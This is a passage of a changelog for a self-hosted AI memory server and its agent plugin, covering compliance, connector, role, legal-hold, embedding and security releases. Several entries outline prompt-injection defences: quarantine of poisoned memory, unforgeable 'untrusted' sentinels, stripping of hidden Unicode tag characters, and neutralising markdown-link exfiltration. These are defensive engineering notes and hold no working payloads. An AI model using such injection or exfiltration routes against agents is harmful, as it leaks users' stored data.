  excluded from recall, KG, and export); a documented basis stores normally.
- **Pre-filled PIA template** — `PIA_TEMPLATE.md` draws the ops picture (data,
  lawful basis, retention, recipients, transfers) so the DPO's PIA is not a
  blank page (pre-filled, not auto-filed).
- **DPO contact on `/health`** — `BRAIN_DPO_CONTACT` surfaces the named Data
  Protection Officer on the public health probe + privacy notice (null when
  unset, never invented).
- **Security fixes:** Scraped data without a lawful-basis provenance is no longer silently stored.
### Engineering record

- **M1 — posture.** `src/ph.rs` ships the pure decision logic: the `DPA_CONTROLS`
  cross-reference map + `scrape_posture` (scrape-family sources need a bounded
  `lawful_basis` or they quarantine) + `notification_deadlines` (ph NPC 72h /
  eu authority 72h / subject-notification, de-duplicated, from `discovered_at`).
  `COMPLIANCE_PH.md` documents the control map to shipped features.
- **M2 — breach workflow.** `src/breach.rs` (`open`/`add_event`/`close`/`list`/
  `get`) + `src/handlers/breaches.rs` (the five routes, DPO/admin role-gated via
  `can_act_on_breach`, audited); `AuditKind::Breach`; migration adds the
  `breaches` + `breach_events` tables (schema → 1.25.0); wired into the router,
  the route-coverage + route-authz guard tables, and openapi.yaml.
- **M3 — PIA + scraping.** `PIA_TEMPLATE.md`; `IngestRequest` gains `source` +
  `lawful_basis`; `ingest_one` quarantines a no-basis scrape via the existing
  flag seam.
- **DPO contact** — `config::dpo_contact()` (`BRAIN_DPO_CONTACT`) surfaced on
  `health_body.compliance.dpo_contact`.
- **Tests** (server bin 571 → 582 passed / 6 ignored; lib 105 unchanged):
  `compliance_ph_covers_dpa_controls` (M1), `breach_workflow_computes_
  jurisdiction_deadlines` + `countdown` + `dpo_role_is_the_breach_actor` (M2),
  `breach_chain_verified` (audit chain over breach events), `health_surfaces_
  dpo_contact`, `scraped_data_without_basis_quarantined`, `breach_lifecycle_
  open_event_close` + list bounds + validation. Clippy `-D warnings` (default +
  bench + otel) + fmt clean. Route-coverage + route-authz audit green.
- **Honest ceilings** — breach detection is **human-opened** (anomaly/leak
  sensors are v2.x); a jurisdiction absent from the deadline table yields no
  deadline (the DPO confirms); the PIA is pre-filled, not auto-filed; **HB 7396
  is forward-watch only** — the structure absorbs it but nothing is
  pre-implemented; each BPO client's own jurisdiction is the v1.26.0 cross-border
  follow-up; the client Security-panel countdown surfacing is a client release.

---



## [1.24.0] — 2026-08-15

### Server — "Connectors" (vertical tool integrations, profile-gated)

Server `Cargo.toml`/lock 1.23.0 → 1.24.0; client + plugin unchanged. The
supervised connector pipeline (v0.9.6 Bridge: backfill + reconcile + cursor +
source/revision linkage) gains the **vertical-configuration lever** and the
**shared translate template** the twelve USE_CASES.md audiences need — CRM,
Slack, Jira/Linear, and the read-only HRIS/EHR records — on the same template
as the existing GitHub connector. No new pipeline; each connector is a
translate+ingest module gated by a profile's `connectors_allowed` (v1.21.0).
Reconcile, never auto-sync; read into memory, never write-back. See
`IMPLEMENTATION_PLAN_v1.24.0_Connectors.md`.

### Release notes

- **Profile-gated connector registry** — `POST /connectors/register` (Admin,
  audited) validates a connector kind against the shipped vocabulary and
  refuses with `403 connector_not_in_profile` any kind a domain's bound
  profile does not grant. A `health-hipaa` domain can register `ehr-readonly`
  but not `slack`; a `sales-team` domain registers any `crm-*`. An unbound
  domain keeps the no-constraint posture.
- **Shared connector translate template** — CRM opportunities, Slack
  messages, Jira/Linear issues, and read-only HRIS/EHR records translate to
  markdown docs carrying a stable source URI (`crm://`, `slack://`, `jira://`)
  that links into the existing source/revision model and feeds the
  kind-scoped `/sources/reconcile`. Read-only PII records (HRIS/EHR) default
  to `private` access scope; every record still flows through the injection
  screen, so a poisoned record quarantines rather than reaching memory.
- **CLI vocabulary-aware messages** — `brain connect` / `brain sync` and
  `brain connector-status` now recognise the full v1.24 kind set and point
  operators at the register route instead of stale "v0.9.7+" text.
- **Security fixes:** Connector registration is now enforced server-side against the domain's
  profile before a connector can advertise for that domain.
### Engineering record

- **M1 — registry + profile gating.** `src/connector/kind.rs` pins the shipped
  vocabulary (`CONNECTOR_KINDS`), `is_connector_kind()`, and `family()`;
  `src/profile.rs` adds `Profile::connector_allowed()` — the pure gate
  (`connectors_allowed` absent → allow; explicit empty → deny-all, the
  air-gap posture; otherwise exact match or bare-family grant for `a-b` sub-
  kinds). `src/handlers/connectors.rs` gains the `POST /connectors/register`
  Admin+audited route; wired into the router, the route-authz guard table, and
  openapi.yaml. **M2 — the translate template.** `src/connector/pipeline.rs`
  (`ConnectorDoc`, `connector_source_kind`, `live_uris`, plus `translate_*`
  for crm/slack/issue/structured-fact) is the pure core every connector feeds;
  source/revision linkage and kind-scoped reconcile reuse the existing
  `sources` layer. **M3 — supervised.** Kind-scoped reconcile sweep + the
  injection screen applied to translated content. **M4 — CLI** message tuning.
- **Tests** (server bin 569 → 571 passed / 6 ignored; lib 95 → 105 passed):
  `kind` vocabulary/unknown-reject/family; `Profile::connector_allowed`
  gating (hipaa/sales/air-gap); `pipeline` translate + source-kind + live-uri
  linkage (the `crm_backfill_links_source_and_revision` contract);
  `slack_reconcile_sweeps_deleted_channel_and_spares_other_kinds` (kind-scoped
  sweep); `connector_translated_record_quarantines_on_injection_suspect`
  (poisoned connector content quarantines, clean passes). Route-coverage +
  route-authz audit green with the new route. Clippy `-D warnings` + fmt clean.
- **Honest ceilings** — connectors are **supervised backfill + reconcile**, not
  real-time streaming (that is v2.x); the per-source transport (paged fetch,
  auth refresh, rate limits) needs per-connector handling and the GitHub
  connector remains the only runnable backfill binary — the other kinds ship
  in the registry + translate template but have no network client yet, so
  this release is the foundation, not the full ten-source sync. Read-only into
  memory; brain-server never mutates Salesforce/Jira/Slack. The client Health
  panel still reads `/connectors` (now with `last_sync`); its connector-status
  card is unchanged. Schema stays 1.23.0 — M1 adds no DDL (the `connectors`
  table already carried `kind TEXT`); the server Cargo bump is release
  alignment only, independent of the shared contract.

---



## [1.23.0] — 2026-08-15

### Client — "Roles" (operator console renders what your role can act on)

Server + client `Cargo.toml`/locks (1.22.0/1.21.0 → 1.23.0); plugin
unchanged. The v1.17.1 operator roles promised role-based posture; the UI
never gated on them. This release makes the operator console render what the
resolved role can act on — **client-side only, with zero new endpoints and
zero new server fields.** The MCP surface already accepted `{name, roles[]}`
and stamped the JWT `roles` claim; M3 just mirrors delegated/server roles
into the existing claims shape the client already parses. See
`IMPLEMENTATION_PLAN_v1.23.0_Roles.md`.

### Release notes

- **Role-aware operator console** — the console now hides what your role
  cannot act on. The Review queue gates its actions: approve requires a
  DPO-capable role (`server` root always counts; reject stays safe for
  everyone; edit is limited to non-approved proposals). The desktop rail and
  mobile tab bar hide Subjects / Security / Audit / Data unless the resolved
  roles grant them. Defense-in-depth — the server still enforces every
  endpoint; this is the UI posture.
- **Roles resolved once per token** — `server` always grants all panels
  (incumbent-equivalent), the JWT `roles` claim grants the delegated set, and
  an absent token is unrestricted loopback-incumbent (today's status quo).
- **Security fixes:** A `qa` or `agent` token can no longer rubber-stamp an approval from the
  Review queue — `role_allows` gates approve/reject/edit before any write.
### Engineering record

- **M3 — `src/role.rs` + `api.rs`** (client). A pure `role_can_see(roles,
  panel)` mapping table resolves `server`/delegated role names → panels and
  actions. `ApiClient::roles()` reads the claim set once per token: the
  `server` role → all panels; any non-`server` role → the JWT `roles` subset
  the server stamped (delegated). `api().roles()` is hoisted once in
  `app()` and read by both the desktop rail and mobile tab bar; the
  `/panels/review.rs` action handlers consult `crate::role::role_allows` to
  gate approve/reject/edit, with approve requiring `role_can_see("dpo")`
  unless `server`-root. Test changes: every `TokenClaims` literal gains
  `roles`; `role.rs` has a unit test per posture — exec hides Subject/Security/
  Audit/Data panels but keeps the dashboard; qa can't approve or purge;
  supervisor approves but doesn't purge; agent hides audit + subjects; solo
  and no-roles see all. Client tests 113 → 119 passed; client clippy
  `-D warnings` + fmt clean; the schema-contract test pins server 1.23.0
  (no schema change — the server Cargo bump is version alignment only,
  independent of the shared contract).

**Honest ceilings** — the gating is UI posture backed by the JWT-presented
`roles`, not server-authoritative RBAC: the endpoints the panels open are
still enforced server-side, but a delegated `roles` claim is trusted exactly
as far as the token (local signing key, not an external IdP). Full
delegated/scoped-role **enforcement** is the v1.25+ line; the `reports`
source for `manages` claims is documented in `src/role.rs`.

---



## [1.22.0] — 2026-08-15

### Server — "Regulated" (legal hold + retention classes + region pin)

Server-only `Cargo.toml`/lock 1.21.0 → 1.22.0; client + plugin unchanged.
The **enforcement** behind the v1.21.0 policy fields, for the regulated
buyer (finance/government/litigation): legal hold, retention reporting,
region pin — plus the compliance-pack posture docs. Small, bounded, real;
no new governance fields, no background worker. See
`IMPLEMENTATION_PLAN_v1.22.0_Regulated.md`.

### Release notes

- **Legal hold** — freeze any chunk against every erasure path (decay
  skip, `/purge` and DSAR refusal) with an explicit reason; a held id stays
  frozen until the hold is explicitly released, and multiple concurrent
  holds are allowed. A DSAR that hits a held id defers that erasure and lists
  the id + reason on the certificate, so a subject is told *why*.
- **Retention reporting** — `GET /retention/report`: a per domain × kind →
  TTL → count → expiring-in-30-days table, the storage-limitation evidence
  HIPAA/SOX/FedRAMP reviewers ask for.
- **Region pin** — `BRAIN_REGION` stamps every chunk, `/export`, and the
  DSAR certificate with where the data lived (`eu-west-1`, `ph-manila`, …),
  the data-residency provenance a residency clause points at. A stamp is
  never rewritten, so history is preserved across a region change.
- **Compliance pack** — HIPAA, SOX, and FedRAMP/FISMA posture maps appended
  to `COMPLIANCE.md` (§10), mapping the shipped controls to each framework.
- **Security fixes:** A legally held id is now **frozen against erasure**: `/purge` and DSAR
  refuse it (`409 legal_hold_active` with the hold reasons) and it never
  appears in the decay review as "safe to purge".
### Engineering record

- **M1 — legal hold** (`src/legal_hold.rs` + `src/handlers/holds.rs` +
  migration). New `legal_holds` table `(id PK, knowledge_id, reason,
  held_by, held_at, released_at)` lives in every domain DB so enforcement
  runs in the same pool/tx as the purge it gates; a partial index serves
  only active (unreleased) holds. `POST /legal-hold` (ids + reason, bounded
  by `MAX_HOLD_IDS`), `POST /legal-hold/{id}/release` (404 on unknown /
  already-released), `GET /legal-holds` (filterable, Admin) — every action
  audited. Enforcement: `page_decayed` filters held ids out of `/decayed`;
  `purge` returns `409 legal_hold_active` (+ the per-id reasons) via the new
  `HandlerError::conflict_with`; `run_dsar_pool` locates held targets,
  **defers** (never purges) them, and lists `{id, reasons}` on the
  certificate's `held_ids[]`. Multiple concurrent holds are supported; an id
  is frozen until EVERY hold on it is explicitly released (never auto).
- **M2 — retention report** (`handlers::govern::retention_report`). Reads
  the effective per-kind policy (server defaults + persisted overrides; a
  bound profile's retained kinds are honored) and joins it against each
  domain's rows: kind → ttl_days → count → count expiring within 30d.
  Reportable policy, not auto-delete (human purges; holds block even that).
- **M3 — region pin** (`storage_layout::region`/`region_from` +
  `knowledge.region` column + an `AFTER INSERT` trigger). `BRAIN_REGION`
  (lowercase alnum+hyphen label, 1..=63, fail-closed on anything else) is
  stamped at INSERT by a trigger (all ingest paths, zero per-site churn),
  backfilled onto legacy NULL rows once, and never rewritten (a region
  change preserves where pre-existing rows lived; the trigger re-points to
  stamp new rows). Surfaced on every chunk + `/export` + the DSAR
  certificate + bundle.
- **M4 — compliance pack** (`COMPLIANCE.md` §10): HIPAA control map
  (access/audit/integrity/min-necessary/PHI tokenization/retention/hold),
  SOX (immutable audit, supersede-not-delete, records preservation, erasure
  refusal), FedRAMP/FISMA posture against NIST 800-53 families. Posture, not
  certification.
- **Tests** — main bin 554 → **556** passed / 6 ignored (incl.
  `legal_hold_freezes_erasure_and_dsar_defers`, `retention_report_matches_policy`),
  lib 86 → **87** (+ `region_from` resolver). The migration contract test now
  pins **schema_version 1.22.0** and the route-authz audit learned the `holds`
  module. Clippy `-D warnings` + fmt clean. The new integration test is
  written idiomatically (`Result<_, Box<dyn Error>>` + `?`, no bare
  `unwrap()` — only `.expect()` with a message and safe `unwrap_or`/`filter_map`).
- **Honest ceilings** — legal hold is per-id manual (no e-discovery
  search-to-hold yet); region is a stamp, not routing (multi-region is v2.x);
  retention classes *report* TTL coverage but don't auto-enforce (decay marks,
  the human purges, legal hold blocks even that); no certification — the
  compliance pack documents a posture, the external audit certifies.

---



## [1.21.0] — 2026-08-15

### Server + client — "Profiles" (presets + the use-case onboarding wizard)

Server `Cargo.toml`/lock 1.20.30 → 1.21.0; client 1.20.25 → 1.21.0; plugin
unchanged. A **Profile** is a typed JSON bundle of the *existing* v1.14/v1.15/
v1.17.1 knobs (access_scope default, PII posture, per-kind retention, audit
level, kind vocabulary) — **no new governance primitives**. One row per name,
bound to a domain, read at request time. The invariant throughout: **the
profile sets defaults, the row wins**; a domain with no bound profile is
byte-identical to pre-v1.21 (the back-compat test pins this). See
`IMPLEMENTATION_PLAN_v1.21.0_Profiles.md` + `USE_CASES.md`.

### Release notes

- **Profiles** — a preset bundle of governance defaults (default access
  scope, PII posture, per-kind retention, audit level, allowed memory kinds)
  that binds to any domain. Takes effect at the next request — no restart,
  no re-ingest; profiles set defaults, an explicit per-row value always
  wins, and an unbound domain behaves exactly as before.
- **12 ship-with presets** for common team postures (health/HIPAA, call
  center, sales, engineering, HR, finance/SOX, government, small business,
  and more) — curated starting points, every field editable via the API.
- **Onboarding wizard** — `brain setup` (CLI) and a "What best describes
  your team?" step in the web client: pick a preset, see the knobs it sets,
  apply. A configured store in under a minute.
- **Friendlier retention on ingest** — new `ttl_days` field (expiry in days
  from now) alongside the absolute `expires_at`.
- **Per-domain retention schedules** — a bound profile's retention replaces
  the server-wide policy for that domain, including "this kind never
  decays"; recall and the decay review view both honor it.
- **Profile API + visibility** — `GET /profiles`, profile upsert, and the
  domain bind/unbind endpoints (documented in the OpenAPI spec); the client
  Health panel shows the active profile and its effective knobs.
- **Security fixes:** New `pii_mode: strict` profile posture: emails, phone numbers, and card
  numbers are masked **before storage** (one-way placeholders — the raw
  values never reach the database). Previously masking happened only when
  content was read back.
- **Security fixes:** A domain bound to an unreadable or tampered profile now **fails closed**
  (the ingest is refused) instead of silently proceeding without the
  policy.
### Engineering record

- **M1 — apply semantics** (`src/profile.rs`, new lib module + migration).
  `profiles(name PK, json)` + `domain_profiles(domain PK → profile)` tables
  (the plan's `domain.profile` FK — domains are labels, so the binding is its
  own keyed row); schema_version → 1.21.0 (additive; no column changes).
  At ingest: `pii_mode: strict` masks title+content at the write boundary via
  the existing `screen_source_prompt` maskers (`[redacted:email|phone|card]`
  stored, raw never lands — deliberately NOT a vault, per the v1.20.19
  posture: one-way, no recovery map); `default_access_scope` fills only an
  ABSENT value; `kinds` is a constraint (an out-of-vocabulary effective kind
  → 400 `kind_not_allowed`). Unreadable bound profile fails CLOSED (a
  strict-posture domain must not silently ingest raw PII). New friendly
  `ttl_days` ingest field (days-from-now → `expires_at`; an explicit absolute
  always wins). At retrieval: a bound profile's `retention` block REPLACES
  the server-wide policy for that domain (explicit JSON `null` = that kind
  never decays; an empty block = nothing decays — the smb-simple posture);
  `/decayed` judges each row by ITS domain's policy (the SQL superset unions
  kinds + the least-restrictive cutoff, so the superset property holds);
  `audit_level` drives `/recall` read-events when `BRAIN_AUDIT_READ_EVENTS`
  is unset (verbose on / minimal off / standard = the JWT posture default;
  the env stays the deployer kill-switch).
- **M2 — the 12 ship-with presets**, seeded by migration from the
  USE_CASES.md matrix (`gov-fedramp`, `health-hipaa`, `call-center`,
  `sales-team`, `engineering`, `hr-people`, `finance-sox`, `smb-simple`,
  `medium-team`, `bpo-multi`, `enterprise`, `global-multi-region`). Seeding
  is INSERT OR IGNORE — operator edits to a preset survive re-migrations.
  They are starting points, not locked: every field is editable via
  `POST /profiles/{name}`.
- **M3 — the onboarding wizard.** `brain setup [domain] [--profile NAME]
  [--yes]`: pick a preset from the live list, see the knobs it sets
  (render_knobs, unit-tested), bind, done — a configured store in under a
  minute, no feature tours. The client connect flow gains the "What best
  describes your team?" step (native `<select>`, knob preview, Apply/Skip;
  shows when the home domain is unbound; the skip persists via the web pref
  seam; the silent auto-reconnect path stays silent — a returning operator
  with a saved token is not the onboarding audience).
- **M4 — the API + visibility.** `GET /profiles`, `GET|POST /profiles/{name}`
  (upsert, Admin + audited), `GET|POST /domains/{name}/profile` (bind/unbind,
  Admin + audited; `null` unbinds — the back-compat escape hatch), documented
  in `openapi.yaml` (+ the `Profile`/`ProfileUpsert` schemas, a `NotFound`
  response component); the client Health panel gains the profile card — the
  active profile + effective knobs (transparency = the 2026 compliance ask),
  rendering the unbound state explicitly rather than a blank.

**Validation:** server main bin 542 → 548 passed / 6 ignored (incl. the new
`#[ignore]`d `profiles_end_to_end_wizard_and_ingest` — verification 1–4
through the real router: strict masking stores only placeholders, explicit
`ttl_days` beats the profile's episodic default, the bind flow lands the
binding + effective knobs, an unbound domain is byte-identical); lib 80 → 86
(profile parse/validate/bind/audit-layering + the 12-preset contract); brain
CLI +1 (render_knobs); client 111 → 113 (profiles parse + retention labels,
bound/unbound binding views). Clippy `-D warnings` + fmt clean on default,
`bench`, AND `otel` features; client wasm release build 4.99 MB (budget 7 MB).

**Honest ceilings:** profile defaults apply on the structured `/ingest`
family (incl. `?format=ump` / `ump-md`); the `/ingest/markdown` +
`/ingest/memory` vault paths and the HITL `/ingest/proposal` flow keep their
current behavior (binding those is v1.22 work). Strict-mode masking runs
after auto-routing (the route
needs the embedding), so the quantized vec0 embedding + caller-declared
entity names derive from the raw text (neither practically invertible;
entities were always stored verbatim). The HITL `/ingest/proposal` flow keeps
its v1.14 posture — promotion lands in `global` with column defaults (binding
the gate flow to profiles is v1.22 work). `audit_level` covers `/recall` (the
decision-path read); `/search`, `/get`, `/multi-get` keep the global env
posture. `connectors_allowed` is stored + surfaced only (the connector
registry is not domain-scoped in v1.21; enforcement lands with the v1.24
connector work). `legal_hold_default` is a stored flag; enforcement is
v1.22.0 "Regulated". The wizard binds the home (`global`) domain — per-domain
wizard targeting is `brain setup`'s job; knob EDITING in the wizard is the
API's job. The 12 presets are curated starting points, not certified
configurations (certification is the operator's external audit; COMPLIANCE.md
maps the path). Profiles set defaults; they are not a locked policy an
operator can't override per-row (by design — the human decides).

---



## [1.20.30] — 2026-08-14

### Server — "Caliber (foundation)" (the Embedder trait + tiered neural store)

Server `Cargo.toml`/lock 1.20.29 → 1.20.30 (server-only; client + plugin
unchanged). The v1.28 "Caliber" M1+M2 groundwork, released early so it does
not sit unreleased across the v1.21–v1.27 compliance line — the two lines are
independent (Acuity touched embedding/search internals; Profiles touches
ingest defaults + API surface). **The default build is byte-identical in
behavior**: `edge-default` stays on `potion-retrieval-32M`, no reranker, 512-d
store — every neural path is opt-in via feature flags + profile env. See
`IMPLEMENTATION_PLAN_v1.28_Caliber.md` +
`IMPLEMENTATION_ROADMAP_v1.28_to_v2.0_ACUITY_EVIDENCE_GATED.md`.

### Release notes

- **Bug fixes:** First-query timeouts after enabling the rerank tier — the model is now
  loaded and warmed at startup instead of lazily inside the first recall.
- **Improvements:** Embedding models are now swappable behind a single interface, with
  **opt-in quality tiers** (all off by default; the default build is
  byte-identical in behavior):
  - `enterprise` tier — BGE-M3 embeddings (1024-d).
  - `desktop` tier — gte-base-en-v1.5 (768-d).
  - an optional local cross-encoder rerank tier (bge-reranker-v2-m3) that
    reorders recall results after fusion.
- **Improvements:** The vector store stamps its dimension and **refuses a mismatched
  dimension switch** instead of silently comparing vectors of different
  sizes.
- **Improvements:** `brain-server --re-embed <tier>` re-embeds the whole store when moving
  between tiers (offline escape hatch).
- **Improvements:** The desktop memory ceiling rises to 1024 MiB to fit the optional neural
  tiers (edge/Jetson stays 512).
### Engineering record

- **M2 — the `Embedder` abstraction** (`src/embed.rs`, new lib module). The
  embedding model moves behind an object-safe trait
  (`encode`/`encode_one`/`store_dim`/`model_id`); `AppState.model` becomes
  `Arc<dyn Embedder>`; all ~13 encode call sites (recall/ingest/proposals/
  procedure/suggest/embeddings/reindex) are profile-agnostic. The default
  `StaticEmbedder` delegates to model2vec verbatim (the golden-vector test is
  `#[ignore]` — HF fetch; the practical proof is the whole suite passing
  unchanged + the edge eval matching the v1.17.4 baseline byte-for-byte).
- **M2 — profile-parameterized store dimension** (`src/migration.rs`).
  `run_migration_with_store_dim(db, mmap, dim)` interpolates the vec0 DDL's
  dimension; `run_migration` stays as the 512-d wrapper so every existing
  caller (tests, migrate-rehearse, domain_registry) is unchanged. A new
  `embedding_dim` stamp in `schema_meta` is checked **before** any vec0 DDL:
  fresh DB stamps the active dim; same-dim is idempotent; **a cross-dim
  profile switch fails closed** with a clear error instead of silently
  comparing a 1024-d query against a 512-d store. `+5 dim_tests` (fresh-stamp,
  idempotent, mismatch-refusal, legacy-default round-trip, repoint-escape).
- **M2 — the neural tiers** (`--features neural-embed`, off by default — the
  ROADMAP "no new heavy runtime" doctrine holds; fastembed 5 optional,
  ort rc.12 → rc.13 to unify the graph). `MODEL_PROFILE=enterprise` →
  BGE-M3 (1024-d; verified end-to-end: dense+sparse+colbert from one
  FastEmbed pass — the sparse/colbert heads land as a v1.30 RRF leg +
  rerank, consumed here only as dense). `MODEL_PROFILE=desktop` →
  gte-base-en-v1.5 (768-d, FastEmbed in-enum).
  **ponytail:** gte-modernbert-base (55.33 vs 54.09 BEIR) is the better desktop
  model but is NOT in FastEmbed's enum — it needs a custom-ONNX fetch
  (`try_new_from_user_defined`); gte-base-en-v1.5 ships now, modernbert is
  the verified upgrade path.
- **M1 — the rerank tier** (`src/search/rerank.rs`, new, `--features
  rerank-tier`). `bge-reranker-v2-m3` via FastEmbed `TextRerank` (the current
  local-SOTA cross-encoder — NOT the 2021 ms-marco-MiniLM), LazyLock-loaded,
  **fail-open** (any ONNX/lock fault leaves the RRF order standing), writing
  the reserved `rerank_score`/`rerank_truncated` provenance slots after
  fusion+PRF in `perform_search_with_prf`. Boot arms it
  (`BRAIN_RERANK_ENABLED=1`) on enterprise/desktop/quality-local and **warms
  it at boot** — a lazy first-recall load put the model download inside the
  request path (observed live: first-query 503 `recall timed out`; fixed).
- **The `--re-embed <profile>` escape hatch** (`src/main.rs` +
  `migration::rebuild_vec_store_at_dim`). Offline operator command: repoints
  the store at the target dim (stamp + DROP/CREATE + legacy `embeddings`
  cleared — those f32 rows are the OLD dim and re-backfilling them would be
  cross-dim corruption), then re-embeds every chunk (the `/reindex` loop
  shape, inline — the handler needs a bootable AppState, this runs cold).
  The fail-closed error names it.
- **Capacity: Desktop RSS ceiling 512 → 1024 MiB** (`src/capacity.rs`). The
  neural tiers measured ~830 MiB live (gte + reranker); 512 pinned the
  warning band permanently on desktop hardware. Jetson stays 512 — the 4 GB
  edge contract (edge-default on potion measured ~340 MiB, well under).

**Tier smoke (directional, NOT a parity claim — `BENCHMARKS.md` §v1.28):** all
three tiers run live through `/recall` (fresh DB, 10-doc corpus, `brain eval`,
37 queries, this M1 Pro, cached models): edge = the v1.17.4 baseline
byte-consistent (MRR 0.905 / nDCG 0.911); desktop & enterprise = MRR 0.919 /
nDCG 0.917 — the rerank precision lift is visible even on a recall-saturated
set. Desktop and enterprise are identical on this set (expected: same
reranker, and the set can't differentiate recall at n=37).

**Server validation:** main bin 534 → 542 passed / 5 ignored; lib 76 → 80
passed / 1 ignored (incl. the `#[ignore]`d BGE-M3 end-to-end load test —
downloads ~600 MB, run with `--features neural-embed -- --ignored`); clippy
`-D warnings` + fmt clean across default AND `--features
neural-embed,rerank-tier`; live `/recall` smoke against an 8,732-doc copy of
the operator vault (edge) + the per-profile tier runs above.

**Honest ceilings:** the tier smoke's 10-doc/37-query set is recall-saturated
— it shows the rerank ordering lift only; the ≥100-query frozen set + the
IronCurtain head-to-head (v1.31 "Proven") are still `pending`, so **no
parity-or-better claim is made**. BGE-M3's sparse+colbert outputs are verified
emitted but not yet consumed (v1.30). `--re-embed` is offline-only and
re-runnable but not transactional. The neural tiers are desktop-verified;
Jetson + ARM release-build verification is the operator's `bench --envelope`
step. `install-service.sh`/`brain -V` pick this up on the next install — the
running launchd service still runs 1.20.29 until then.



## [1.20.29] — 2026-08-14

### Server + plugin — "Bound" (amplification + clamp + bind fail-closed)

Server `Cargo.toml`/lock 1.20.28 → 1.20.29; plugin 0.4.1 → 0.4.2. The cleanup /
consolidation release of the ATLAS audit line — three bounds closed, one theme.
No new endpoints, no new fields, no telemetry. See
`IMPLEMENTATION_PLAN_v1.20.29_Bound.md`. **ATLAS F-5 / F-6 / F-7.**

### Release notes

- **Improvements:** The openclaw plugin collapses same-query recalls within a turn into a
  single server call (previously one turn could fan out several), and caps
  recalls per session turn.
- **Improvements:** Tool parameters are schema-checked instead of cast, per-hit content is
  clamped to a sane length, and the context-token ceiling is enforced
  consistently — smaller prompts, no runaway context growth.
- **Security fixes:** The server **refuses to start** when bound to a non-loopback interface
  with no auth configured — previously that combination silently exposed
  an unauthenticated, fully-privileged API.
### Engineering record

- **Bind fail-closed** (`src/main.rs`). `handlers/mod.rs:385` treats a `None`
  principal as superuser (the loopback back-compat posture); the symmetric gap
  was that a non-loopback bind with no `AUTH_TOKEN`/JWT configured would expose
  an unauthenticated superuser API. New `enforce_loopback_bind_guard` (two pure
  predicates `bind_is_loopback`/`auth_configured`, reusing `config::auth_tokens`
  + `AuthMode`) refuses to start in that case — the G3 fail-closed posture,
  applied to the bind side. `+1 test`. **ponytail:** startup-only enforcement;
  no runtime rebind re-check; does NOT add per-principal rate limiting (v2.1).
- **Plugin request amplification bound** (`plugin/index.ts`). The three recall
  call sites (auto-recall hook, corpus `search`, `memory_recall` tool) shared no
  guard, so one turn could fan out N recalls. A closure-scoped
  `Map<queryKey, Promise>` collapses same-query-same-turn recalls into one server
  POST, and a per-session counter caps recalls per turn (`MAX_RECALLS_PER_TURN
  = 10`; over-cap → empty no-op, not error). `+2 plugin tests`.
- **Plugin param clamp + body cap** (`plugin/src/tools.ts`). The raw
  `(params ?? {}) as X` casts (no narrowing guard) are replaced by a
  `checkedParams()` helper backed by typebox `Check` (a `value is Static<S>` type
  predicate — on schema failure params collapse to `{}` and existing `??
  default` branches take over, fail-closed). `memory_recall.maxContextTokens`
  schema max 32000 → 8000 to match `config.ts:55`. Per-hit `content` is clamped
  to `MAX_HIT_CHARS = 1000` before `formatRecallContext` (caller-side, so
  `format.ts` stays untouched). `+1 plugin test`.

**Server validation:** `cargo test --features bench` 542 → 542 passed / 5 ignored
(main bin; +1 net new), clippy `-D warnings` + fmt clean. **Plugin validation:**
`tsc --noEmit` + vitest 47 passed + oxlint clean (run via the openclaw workspace —
`plugin/` has no standalone runner; `@openclaw/plugin-sdk` is `workspace:*`).



## [1.20.28] — 2026-08-14

### Server + plugin — "Fencepost" (information-flow integrity)

Server `Cargo.toml`/lock 1.20.27 → 1.20.28; plugin 0.4.0 → 0.4.1. Two coupled
information-flow changes, one theme. No new endpoints, no new fields. See
`IMPLEMENTATION_PLAN_v1.20.28_Fencepost.md`. **ATLAS F-3 / F-4.**

### Release notes

- **A quarantined proposal lost its warning flag on approval** — the
  promotion insert never carried the flag, so content the injection screen
  had quarantined became an ordinary retrievable memory with no trace of
  the verdict. Approval now re-screens and preserves the flag as
  provenance (the human's decision stays final; the flag is a record, not
  a recall block).
- **Improvements:** The audit log now records the screen verdict on every approval
  (clean/quarantine/reject), so post-hoc review can see what the
  deterministic screen would have said.
- **Security fixes:** The plugin's `untrusted` marker is now **enforced, behind an unforgeable
  fence**: untrusted recall content is wrapped in begin/end sentinels that
  recalled chunks cannot forge (literal sentinels are stripped from hit
  bodies), and only explicitly-untrusted hits are injected into the prompt.
- **Security fixes:** Unicode tag-block characters (U+E0000–U+E007F) and markdown references
  are additionally stripped from plugin-bound text.
### Engineering record

- **Server: quarantine taint survives HITL promotion as provenance**
  (`src/handlers/gate.rs`). The `approve_proposal` INSERT (L624) omitted the
  `flagged` column (default `0`), so a proposal the deterministic screen
  **quarantined** at ingest became, on approval, an unflagged retrievable memory
  with no provenance that it was flagged. The approve path now re-runs the screen
  (`crate::screen::screen(&content, "")`) and sets `flagged` from the verdict
  (`Quarantine`/`Reject` → 1, `Clean` → 0), and the audit detail carries the
  verdict label (`proposal_approved:screen_quarantine` etc.). The human's decision
  stays final (mantra #3) — `flagged` is provenance, NOT a recall deny; recall
  segregation unchanged. `+2 tests`.
- **Plugin: the `untrusted` tag is now enforced, behind an unforgeable fence**
  (`plugin/src/format.ts`). `MEMORY_BANNER` was an advisory preamble with no
closing delimiter and `hit.untrusted` was carried but never read (decorative;
the plugin admitted this at `format.ts:76-78`). New `UNTRUSTED_BEGIN` /
  `UNTRUSTED_END` sentinels wrap the block; `sanitizeForBlock` strips any literal
  sentinel from hit bodies so a recalled chunk cannot forge the close.
  `formatRecallContext` now filters to `untrusted === true` (drops the rest;
  fail-safe → empty injection if none qualify). `sanitizeForBlock` also gains the
  `U+E0000–U+E007F` tag block (the one set the prior regex omitted — requires the
  `u` flag + `\u{...}` form) and the markdown-ref strip (defense-in-depth; the
  server strip from v1.20.27 means the plugin already receives clean text).
  `+3 plugin tests` (+ 2 supporting fixes to keep the existing suite green under
  the enforced-fence contract).

**Honest ceilings:** NOT a CaMeL/FIDES capability lattice (mantra #2 forbids);
  the fence is transport-layer data/instruction separation only. `flagged` is
  advisory metadata, not a recall deny (a v2.x ACL could deny recall of
  post-quarantine chunks by role). **Validation:** server 44 gate tests pass
  (`cargo test --features bench --bin brain-server gate`), clippy clean; plugin
  `tsc`/`vitest` clean via the openclaw workspace (`plugin/` has no standalone
  runner).



## [1.20.27] — 2026-08-14

### Server — "Cordon" (EchoLeak markdown exfil neutralized at the read seam)

Server `Cargo.toml`/lock 1.20.26 → 1.20.27; plugin unchanged. One pure function,
one composition point. No new endpoints, no new fields. See
`IMPLEMENTATION_PLAN_v1.20.27_Cordon.md`. **ATLAS F-2 (High).**

### Release notes

- **Markdown-link exfiltration neutralized at the read seam** (the
